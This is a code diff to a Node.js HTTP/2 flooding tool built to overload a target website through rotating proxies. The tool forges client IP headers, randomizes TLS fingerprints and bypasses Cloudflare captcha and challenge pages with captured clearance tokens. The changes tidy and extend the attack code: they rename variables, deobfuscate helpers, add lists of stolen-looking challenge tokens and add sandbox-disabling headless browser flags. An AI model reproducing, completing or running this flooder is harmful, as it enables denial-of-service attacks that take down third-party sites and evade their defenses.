@@ -2,7 +2,7 @@ const net = require('net');
 const http2 = require("http2");
 const tls = require('tls');
 const cluster = require('cluster');
-const URL = require("url");
+const url = require("url");
 const fs = require("fs");
 const crypto = require("crypto");
 const axios = require('axios');
@@ -25,14 +25,14 @@ var privacyPassSupport = true;
         useNewToken();
     }
 
-    function bypass(proxy, userAgents, callback, force) {
+    function bypass(proxies, userAgents, callback, force) {
         num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 10))
         var cookie = "";
         if (l7.firewall[1] == 'captcha' || force && privacyPassSupport) {
             request.get({
                 targetURL: l7.targetURL + "?_asds=" + num,
                 gzip: true,
-                proxy: proxies,
+                proxies: proxies,
                 headers: {
                     'Connection': 'Keep-Alive',
                     'Cache-Control': 'max-age=0',
@@ -62,7 +62,7 @@ var privacyPassSupport = true;
                     cloudscraper.get({
                         targetURL: l7.targetURL + "?_asds=" + num,
                         gzip: true,
-                        proxy: proxies,
+                        proxies: proxies,
                         headers: {
                             'Connection': 'Keep-Alive',
                             'Cache-Control': 'max-age=0',
@@ -80,7 +80,7 @@ var privacyPassSupport = true;
                             cookie += '; ' + res.headers['set-cookie'].shift().split(';').shift();
                             cloudscraper.get({
                                 targetURL: l7.targetURL + "?_asds=" + num,
-                                proxy: proxies,
+                                proxies: proxies,
                                 headers: {
                                     'Connection': 'Keep-Alive',
                                     'Cache-Control': 'max-age=0',
@@ -118,14 +118,14 @@ var privacyPassSupport = true;
                                         console.warn(`[privacy-pass]: server sent unrecognised response code (${header.value})`);
                                         break;
                                 }
-                                return bypass(proxy, userAgents, callback, true);
+                                return bypass(proxies, userAgents, callback, true);
                             }
                         }
                     });
                 } else {
                     cloudscraper.get({
                         targetURL: l7.targetURL + "?_asds=" + num,
-                        proxy: proxies,
+                        proxies: proxies,
                         headers: {
                             'Connection': 'Keep-Alive',
                             'Cache-Control': 'max-age=0',
@@ -137,7 +137,7 @@ var privacyPassSupport = true;
                         if (err || !res || !res.request.headers.cookie) {
                             if (err) {
                                 if (err.name == 'CaptchaError') {
-                                    return bypass(proxy, userAgents, callback, true);
+                                    return bypass(proxies, userAgents, callback, true);
                                 }
                             }
                             return false;
@@ -149,7 +149,7 @@ var privacyPassSupport = true;
         } else if (l7.firewall[1] == 'uam' && privacyPassSupport == false) {
             cloudscraper.get({
                 targetURL: l7.targetURL + "?_asds=" + num,
-                proxy: proxies,
+                proxies: proxies,
                 headers: {
                     'Upgrade-Insecure-Requests': 1,
                     'User-Agent': userAgents
@@ -157,7 +157,7 @@ var privacyPassSupport = true;
             }, (err, res, body) => {
                 if (err) {
                     if (err.name == 'CaptchaError') {
-                        return bypass(proxy, userAgents, callback, true);
+                        return bypass(proxies, userAgents, callback, true);
                     }
                     return false;
                 }
@@ -165,7 +165,7 @@ var privacyPassSupport = true;
                     callback(res.request.headers.cookie);
                 } else if (res && body && res.headers.server == 'cloudflare') {
                     if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
-                        return bypass(proxy, userAgents, callback, true);
+                        return bypass(proxies, userAgents, callback, true);
                     }
                 } else {
 
@@ -175,7 +175,7 @@ var privacyPassSupport = true;
             cloudscraper.get({
                 targetURL: l7.targetURL + "?_asds=" + num,
                 gzip: true,
-                proxy: proxies,
+                proxies: proxies,
                 headers: {
                     'Connection': 'Keep-Alive',
                     'Cache-Control': 'max-age=0',
@@ -188,7 +188,7 @@ var privacyPassSupport = true;
             }, (err, res, body) => {
                 if (err || !res || !body || !res.headers['set-cookie']) {
                     if (res && body && /Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode !== 200) {
-                        return bypass(proxy, userAgents, callback, true);
+                        return bypass(proxies, userAgents, callback, true);
                     }
                     return false;
                 }
@@ -289,17 +289,17 @@ function getStatus() {
     }
   });
 }
-function getTitleFromHTML(_0x330231) {
-  const _0x55b3e2 = /<title>(.*?)<\/title>/i;
-  const _0x36b6d0 = _0x330231.match(_0x55b3e2);
-  if (_0x36b6d0 && _0x36b6d0[0x1]) {
-    return _0x36b6d0[0x1];
+function getTitleFromHTML(html) {
+  const titleRegex = /<title>(.*?)<\/title>/i;
+  const match = html.match(titleRegex);
+  if (match && match[1]) {
+    return match[1];
   }
-  return "Not Found";
+  return 'Not Found';
 }
 
-function randomIntn(_0x37244a, _0x5e8397) {
-  return Math.floor(Math.random() * (_0x5e8397 - _0x37244a) + _0x37244a);
+function randomIntn(min, max) {
+  return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randstr(_0x6ba01d) {
@@ -329,9 +329,9 @@ function randnombor(_0x3af870) {
   ;
   return _0x5c028c;
 }
-function randomElement(_0x21da9f) {
-  return _0x21da9f[Math.floor(Math.random() * (_0x21da9f.length - 0x0) + 0x0)];
-}
+function randomElement(elements) {
+  return elements[randomIntn(0, elements.length)];
+} 
 
 const ip_spoof = () => {
   return Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 100);
@@ -445,6 +445,53 @@ const sig = [
              "sm2sig_sm3",
              "ecdsa_secp521r1_sha512"];
 const pathts = [
+                "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
+                "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
+                "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
+                "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
+                "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
+                "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
+                "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
+                "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
+                "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
+                "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
+                "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
+                "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
+                "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
+                "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
+                "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
+                "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
+                "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
+                "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
+                "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
+                "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
+                "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
+                "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
+                "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
+                "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
+                "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
+                "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U", "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
+                "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
+                "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
+                "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
+                "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
+                "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
+                "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
+                "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
+                "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
+                "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs", 
+                "?page=1", 
+                "?page=2", 
+                "?page=3", 
+                "?category=news", 
+                "?category=sports", 
+                "?category=technology", 
+                "?category=entertainment", 
+                "?sort=newest", 
+                "?filter=popular", 
+                "?limit=10", 
+                "?start_date=1989-06-04", 
+                "?end_date=1989-06-04",
                 "/",
                 "/video",
                 "view_video.php?viewkey=",
@@ -460,6 +507,8 @@ const pathts = [
                 "?id=",
                 "?id",
                 "/#",
+                "homepage",
+                "home",
                 "/home",
                 "/home.php#",
                 "/home.php",
@@ -2387,7 +2436,74 @@ const accept_ranges = [
                       "bytes"
                    ];
 
+
+const cookie = [
+                    "--no-sandbox",
+                    "--disable-setuid-sandbox",
+                    "--disable-infobars",
+                    "--disable-logging",
+                    "--disable-login-animations",
+                    "--disable-notifications",
+                    "--disable-gpu",
+                    "--headless",
+                    "--lang=ko_KR",
+                    "--start-maxmized",
+                    "--ignore-certificate-errors",
+                    "--hide-scrollbars",
+                    "--mute-audio",
+                    "--disable-web-security",
+                    "--incognito",
+                    "--disable-canvas-aa",
+                    "--disable-2d-canvas-clip-aa",
+                    "--disable-accelerated-2d-canvas",
+                    "--no-zygote",
+                    "--use-gl=desktop",
+                    "--disable-gl-drawing-for-tests",
+                    "--disable-dev-shm-usage",
+                    "--no-first-run",
+                    "--disable-features=IsolateOrigins,site-per-process",
+                    "--ignore-certificate-errors-spki-list",
+                    "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
+                    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
+                    "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
+                    "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
+                    "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
+                    "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
+                    "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
+                    "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
+                    "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
+                    "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
+                    "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
+                    "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
+                    "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
+                    "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
+                    "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
+                    "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
+                    "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
+                    "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
+                    "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
+                    "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
+                    "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
+                    "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
+                    "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
+                    "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
+                    "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
+                    "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
+                    "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
+                    "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
+                    "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
+                    "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
+                    "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
+                    "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
+                    "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
+                    "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
+                    "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
+                    "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
+                    "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs"
+                    ];
+
 var CazzySoci = Methods[Math.floor(Math.random() * Methods.length)];
+const CookieCf = cookie[Math.floor(Math.random() * cookie.length)];
 var randomReferer = refers[Math.floor(Math.random() * refers.length)];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
@@ -2402,7 +2518,7 @@ var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
-const parsedTarget = URL.parse(args.target);
+const parsedTarget = url.parse(args.target);
 class NetSocket {
   constructor() {}
   async ['HTTP'](_0x5b2a5b, _0x37b110) {
@@ -2460,6 +2576,7 @@ headers[':method'] = "GET";
 CazzySoci; 
 headers[":authority"] = parsedTarget.host;
 headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + '&' + randstr(10) + queryString + randstr(10);
+headers["origin"] = parsedTarget.host;
 headers[':scheme'] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["cache-control"] = control;
@@ -2478,6 +2595,7 @@ headers['sec-fetch-mode'] = "navigate";
 headers["sec-fetch-dest"] = "document";
 headers["sec-fetch-user"] = '?1';     
 headers.cookie = ["cf_clearance=" + randstr(32) + '.' + randstr(10) + '-' + randstr(10) + '-1.0.1.1-' + randstr(11) + 'vs_V.' + randstr(21) + '' + randstr(47), "?__cf_chl_tk=" + randstr(43), "?__cf_chl_rt_tk=" + randayat(43) + '-' + randnombor(10) + "-0.0.1.1" + randnombor(4)];
+headers["set-cookie"] = CookieCf;
 headers["sec-fetch-site"] = "none";
 headers['x-requested-with'] = "XMLHttpRequest";
 headers['X-Cache'] = "HIT";
@@ -2492,6 +2610,9 @@ headers["X-Forwarded-For"] = spoofed;
 headers["X-Forwarded-Host"] = spoofed;
 headers["Client-IP"] = spoofed;
 headers["Real-IP"] = spoofed;
+headers["Referer"] = randomReferer;
+headers["referer"] = randomReferer;
+headers.referer = randomReferer;
 headers.Referer = randomReferer;
 pathts;
 headers["Referrer-Policy"] = ["Referrer-Policy"];
@@ -2499,7 +2620,7 @@ headers.Pragma = "akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-ca
 headers['x-frame-options'] = randomHeaders["x-frame-options"];
 headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
 function runFlooder() {
-  const proxyAddr = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
+  const proxyAddr = randomElement(proxies);
   const parsedProxy = proxyAddr.split(':');
   headers.origin = 'https://' + parsedTarget.host;
   headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
@@ -2507,8 +2628,8 @@ function runFlooder() {
   headers[":authority"] = parsedTarget.host;
   headers["user-agent"] = moz + az1 + uap1;
   const _0x50454d = {
-    'host': parsedProxy[0x0],
-    'port': ~~parsedProxy[0x1],
+    'host': parsedProxy[0],
+    'port': ~~parsedProxy[1],
     'address': parsedTarget.host + ":443",
     'timeout': 0x64
   };
